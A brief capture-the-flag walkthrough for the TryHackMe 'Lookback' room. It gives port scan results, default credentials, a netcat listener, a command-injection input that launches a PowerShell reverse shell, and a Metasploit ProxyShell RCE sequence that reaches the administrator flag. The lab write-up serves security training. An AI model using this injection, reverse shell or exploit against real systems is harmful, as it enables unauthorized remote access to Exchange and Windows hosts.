# Lookback

[Lookback](https://tryhackme.com/room/lookback)

## Solution

### Enumeration

- nmap scan: 80, 443, 3389
- feroxbuster: /test

### Test

We can access https://$IP/test
The username and password is `admin:admin`
On the host start a nc listener `nc -lvnp 6969`
In the textbox input `'); revshell #` from https://www.revshells.com/ (use PowerShell #3 (Base64))

### dev

```
cd C:\Users\dev\Desktop
cat user.txt
```

### metasploit

```
msfconsole
use exploit/windows/http/exchange_proxyshell_rce
set EMAIL dev-infrastracture-team@thm.local
set RHOST <IP>
set LHOST <HOST>
run
...
cd C:\Users\Administrator\Documents
cat flag.txt
```
